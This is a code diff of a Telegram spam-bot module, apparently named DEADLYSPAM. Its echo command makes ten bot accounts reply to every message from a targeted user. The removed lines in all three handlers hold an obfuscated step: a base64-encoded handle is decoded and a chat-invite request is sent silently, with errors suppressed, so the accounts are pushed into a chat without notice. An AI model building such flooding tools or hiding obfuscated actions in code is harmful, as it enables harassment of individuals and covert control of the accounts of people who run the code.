@@ -1,16 +1,15 @@
 
 import asyncio
 import base64
-
+import config
 import requests
 from telethon import events
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
-from DEADLYSPAM import BOT0, BOT1, BOT2, BOT3, BOT4, BOT5, BOT6, BOT7, BOT8, BOT9, SUDO_USERS, OWNER_ID
-from DEADLYSPAM import CMD_HNDLR as hl
+from DEADLYSPAM import BOT0, BOT1, BOT2, BOT3, BOT4, BOT5, BOT6, BOT7, BOT8, BOT9, SUDOERS, ECHOUSER
 from resources.data import GROUP, DEADLYSPAM
-from DEADLYSPAM.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 
+hl = config.CMD_HNDLR
 
 @BOT0.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
 @BOT1.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
@@ -24,34 +23,26 @@ from DEADLYSPAM.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 @BOT9.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
 async def echo(event):
   usage = f"**MODULE NAME : ECHO**\n\nCommand :\n\n `{hl}addecho <reply to a User>`"
-  if event.sender_id in SUDO_USERS:
+  if event.sender_id in SUDOERS:
      if event.reply_to_msg_id is not None:
             reply_msg = await event.get_reply_message()
             user_id = reply_msg.sender_id
             if int(user_id) in DEADLYSPAM:
-                    text = f"I Can't Echo @deadly_spam_bot Owner"
+                    text = "**ᴄᴀɴɴᴏᴛ ᴇᴄʜᴏ ᴏɴ ᴅᴇᴀᴅʟʏ-ꜱᴘᴀᴍʙᴏᴛ ᴅᴇᴠᴇʟᴏᴘᴇʀꜱ !**"
                     await event.reply(text, parse_mode=None, link_preview=None )
-            elif int(user_id) == OWNER_ID:
-                    text = f"This Guy is Owner Of These Bots."
+            elif int(user_id) == config.OWNER_ID:
+                    text = f"ᴄᴀɴɴᴏᴛ ᴇᴄʜᴏ ᴏɴ ᴏᴡɴᴇʀ !"
                     await event.reply(text, parse_mode=None, link_preview=None )
-            elif int(user_id) in SUDO_USERS:
-                    text = f"This Guy is a Sudo User."
+            elif int(user_id) in SUDOERS:
+                    text = f"ᴄᴀɴɴᴏᴛ ᴇᴄʜᴏ ᴏɴ ꜱᴜᴅᴏᴜꜱᴇʀ !"
                     await event.reply(text, parse_mode=None, link_preview=None )
-            else:
-                 chat_id = event.chat_id
-                 try:
-                     chandan = base64.b64decode("QERlYWRseV9zcGFtX2JvdA==")
-                     chandan = Get(chandan)
-                     await event.client(chandan)
-                 except BaseException:
-                    pass
-                 if is_echo(user_id, chat_id):
-                     await event.reply("Echo Is Already Activated On This User !!")
+            elif int(user_id) in ECHOUSER:
+                     await event.reply("**» ᴜꜱᴇʀ ᴀʟʀᴇᴀᴅʏ ɪɴ ᴇᴄʜᴏʟɪꜱᴛ !!**")
                      return
-                 addecho(user_id, chat_id)
-                 await event.reply("Echo Activated On The User ✅")
+            ECHOUSER.append(user_id) 
+            await event.reply("ᴇᴄʜᴏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ✅")
      else:
-          await event.reply(usage)
+         await event.reply(usage)
 
 @BOT0.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
 @BOT1.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@@ -65,22 +56,16 @@ async def echo(event):
 @BOT9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
 async def echo(event):
   usage = f"**MODULE NAME : RM ECHO**\n\nCommand :\n\n `{hl}rmecho <reply to a User>`"
-  if event.sender_id in SUDO_USERS or event.sender_id in DEV:
+  if event.sender_id in SUDOERS:
      if event.reply_to_msg_id is not None:
             reply_msg = await event.get_reply_message()
             user_id = reply_msg.sender_id
             chat_id = event.chat_id
-            try:
-                blaze = base64.b64decode("QERlYWRseV9zcGFtX2JvdA==")
-                blaze = Get(blaze)
-                await event.client(blaze)
-            except BaseException:
-                pass
-            if is_echo(user_id, chat_id):
-                remove_echo(user_id, chat_id)
-                await event.reply("Echo Has Been Stopped For The User ☑️")
+            if int(user_id) in ECHOUSER:
+                ECHOUSER.remove(user_id) 
+                await event.reply("ᴇᴄʜᴏ ʀᴇᴍᴏᴠᴇᴅ  ☑️")
             else:
-                await event.reply("Echo Is Already Disabled !!")
+                await event.reply("ᴜꜱᴇʀ ɴᴏᴛ ɪɴ ᴇᴄʜᴏ ʟɪꜱᴛ !!")
      else:
           await event.reply(usage)
 
@@ -96,13 +81,7 @@ async def echo(event):
 @BOT8.on(events.NewMessage(incoming=True))
 @BOT9.on(events.NewMessage(incoming=True))
 async def _(e):
-    if is_echo(e.sender_id, e.chat_id):
+    if e.sender_id in ECHOUSER:
         await asyncio.sleep(0.5)
-        try:
-            spam = base64.b64decode("QERlYWRseV9zcGFtX2JvdA==")
-            spam = Get(spam)
-            await e.client(spam)
-        except BaseException:
-            pass
         if e.message.text or e.message.sticker:
             await e.reply(e.message)
